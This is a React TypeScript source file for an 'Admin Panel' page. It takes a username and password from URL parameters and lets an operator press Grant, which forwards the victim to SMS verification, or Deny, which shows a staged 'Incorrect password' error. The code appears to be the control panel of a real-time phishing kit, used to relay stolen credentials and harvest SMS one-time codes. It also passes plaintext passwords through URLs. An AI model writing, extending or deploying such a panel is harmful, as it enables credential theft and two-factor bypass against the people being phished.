import { useState, useEffect } from "react";
import { useMutation } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { CheckCircle, XCircle, Loader2 } from "lucide-react";
import { apiRequest } from "@/lib/queryClient";

export default function AdminPanel() {
  const [location, setLocation] = useLocation();
  const [loginData, setLoginData] = useState<{ username: string; password: string } | null>(null);

  useEffect(() => {
    // Extract username and password from URL parameters
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('username') || '';
    const password = urlParams.get('password') || '';
    
    if (username) {
      setLoginData({ username, password });
    }
  }, []);

  const grantMutation = useMutation({
    mutationFn: async () => {
      if (!loginData) return;
      
      // Execute authentication webhook
      await apiRequest("POST", "/api/admin/grant", {
        username: loginData.username,
        password: loginData.password,
        action: 'grant'
      });
      
      return true;
    },
    onSuccess: () => {
      // Redirect to SMS verification page
      setLocation(`/sms?username=${encodeURIComponent(loginData?.username || '')}`);
    },
  });

  const denyMutation = useMutation({
    mutationFn: async () => {
      if (!loginData) return;
      
      // Send denial notification and show "incorrect password" 
      await apiRequest("POST", "/api/admin/deny", {
        username: loginData.username,
        password: loginData.password,
        action: 'deny'
      });
      
      return true;
    },
    onSuccess: () => {
      // Show "incorrect password" message
      alert("Incorrect password. Please try again.");
      // Redirect back to login
      setLocation("/");
    },
  });

  if (!loginData) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="mx-auto h-8 w-8 animate-spin text-blue-600" />
          <p className="mt-2 text-gray-600">Loading...</p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <Card className="w-full max-w-md">
        <CardHeader className="text-center space-y-1">
          <CardTitle className="text-2xl font-bold text-gray-900">
            Admin Panel
          </CardTitle>
          <p className="text-sm text-gray-600">
            Review login attempt and take action
          </p>
        </CardHeader>
        
        <CardContent className="space-y-6">
          {/* Login Details */}
          <div className="bg-gray-100 rounded-lg p-4 space-y-2">
            <h3 className="font-semibold text-gray-900">Login Attempt Details</h3>
            <div className="space-y-1 text-sm">
              <p><span className="font-medium">Username:</span> {loginData.username}</p>
              <p><span className="font-medium">Password:</span> {"*".repeat(loginData.password.length)}</p>
              <p><span className="font-medium">Time:</span> {new Date().toLocaleString()}</p>
            </div>
          </div>

          {/* Action Buttons */}
          <div className="grid grid-cols-2 gap-3">
            <Button
              onClick={() => grantMutation.mutate()}
              disabled={grantMutation.isPending || denyMutation.isPending}
              className="bg-green-600 hover:bg-green-700 text-white flex items-center justify-center gap-2"
              data-testid="button-grant"
            >
              {grantMutation.isPending ? (
                <Loader2 className="h-4 w-4 animate-spin" />
              ) : (
                <CheckCircle className="h-4 w-4" />
              )}
              Grant
            </Button>
            
            <Button
              onClick={() => denyMutation.mutate()}
              disabled={grantMutation.isPending || denyMutation.isPending}
              variant="destructive"
              className="flex items-center justify-center gap-2"
              data-testid="button-deny"
            >
              {denyMutation.isPending ? (
                <Loader2 className="h-4 w-4 animate-spin" />
              ) : (
                <XCircle className="h-4 w-4" />
              )}
              Deny
            </Button>
          </div>

          {/* Instructions */}
          <div className="text-xs text-gray-500 text-center">
            <p>• <strong>Grant:</strong> Proceed to SMS verification</p>
            <p>• <strong>Deny:</strong> Show "incorrect password" error</p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}